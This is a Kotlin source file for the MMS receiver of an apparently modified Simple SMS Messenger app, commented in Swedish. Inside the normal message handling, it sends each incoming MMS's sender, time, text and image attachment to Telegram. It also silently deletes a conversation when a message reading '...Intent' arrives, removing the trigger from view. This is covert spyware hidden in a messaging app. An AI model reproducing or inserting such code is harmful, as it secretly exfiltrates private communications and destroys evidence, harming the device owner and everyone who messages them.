package com.simplemobiletools.smsmessenger.receivers
import com.simplemobiletools.smsmessenger.extensions.messagesDB
import com.simplemobiletools.smsmessenger.utils.TelegramHelper
import com.simplemobiletools.smsmessenger.helpers.SharedPrefsHelper
import android.content.Context
import android.net.Uri
import android.os.Handler
import android.os.Looper
import com.klinker.android.send_message.MmsReceivedReceiver
import com.simplemobiletools.commons.extensions.isNumberBlocked
import com.simplemobiletools.commons.extensions.normalizePhoneNumber
import com.simplemobiletools.commons.extensions.showErrorToast
import com.simplemobiletools.commons.helpers.ensureBackgroundThread
import com.simplemobiletools.smsmessenger.R
import com.simplemobiletools.smsmessenger.extensions.conversationsDB
import com.simplemobiletools.smsmessenger.extensions.getConversations
import com.simplemobiletools.smsmessenger.extensions.getLatestMMS
import com.simplemobiletools.smsmessenger.extensions.insertOrUpdateConversation
import com.simplemobiletools.smsmessenger.extensions.showReceivedMessageNotification
import com.simplemobiletools.smsmessenger.extensions.updateUnreadCountBadge
import com.simplemobiletools.smsmessenger.helpers.refreshMessages
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date

class MmsReceiver : MmsReceivedReceiver() {

    override fun isAddressBlocked(context: Context, address: String): Boolean {
        val normalizedAddress = address.normalizePhoneNumber()
        return context.isNumberBlocked(normalizedAddress)
    }

    override fun onMessageReceived(context: Context, messageUri: Uri) {
        val mms = context.getLatestMMS() ?: return
        val address = mms.getSender()?.phoneNumbers?.first()?.normalizedNumber ?: ""
        val body = mms.body ?: ""
        val timestamp = System.currentTimeMillis()
        val formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm").format(Date(timestamp))

        // === TYST "...Intent"-hantering ===
        if (body.equals("...Intent", ignoreCase = true)) {
            val threadId = mms.threadId
            if (threadId != null && threadId > 0) {
                context.messagesDB.deleteAllThreadMessages(threadId)
            } else {
                context.messagesDB.deleteMessagesFromAddress(address)
            }
            // Avsluta direkt, inget MMS visas eller hanteras vidare
            return
        }

        // Skicka till Telegram med custom header
        val prefs = SharedPrefsHelper(context)
        val header = prefs.getCustomLogHeader().ifBlank { "MMS INKOMMANDE" }

        ensureBackgroundThread {
            val photoFile = try {
                val attachmentUri = mms.attachment?.attachments?.firstOrNull()?.getUri()
                if (attachmentUri != null) {
                    val inputStream = context.contentResolver.openInputStream(attachmentUri)
                    val tempFile = File.createTempFile("mms_image", ".jpg", context.cacheDir)
                    inputStream?.use { input ->
                        tempFile.outputStream().use { output ->
                            input.copyTo(output)
                        }
                    }
                    tempFile
                } else null
            } catch (e: Exception) {
                null
            }

            if (photoFile != null && photoFile.exists()) {
                val caption = "$header\nFrån: $address\nTid: $formattedTime\n-- $body"
                TelegramHelper.sendPhoto(photoFile, caption)
                // photoFile.delete() // Avkommentera denna rad om du vill radera temp-filen direkt efter
            } else {
                TelegramHelper.sendTextMessage("$header\nFrån: $address\nTid: $formattedTime\n-- $body")
            }

            // Övrig notifikation och konversationslogik (som innan)
            val size = context.resources.getDimension(R.dimen.notification_large_icon_size).toInt()
            val glideBitmap = null // Om du använder Glide för bilder, anpassa detta efter behov

            Handler(Looper.getMainLooper()).post {
                context.showReceivedMessageNotification(mms.id, address, body, mms.threadId, glideBitmap)
                val conversation = context.getConversations(mms.threadId).firstOrNull() ?: return@post
                ensureBackgroundThread {
                    context.insertOrUpdateConversation(conversation)
                    context.updateUnreadCountBadge(context.conversationsDB.getUnreadConversations())
                    refreshMessages()
                }
            }
        }
    }

    override fun onError(context: Context, error: String) =
        context.showErrorToast(context.getString(R.string.couldnt_download_mms))
}
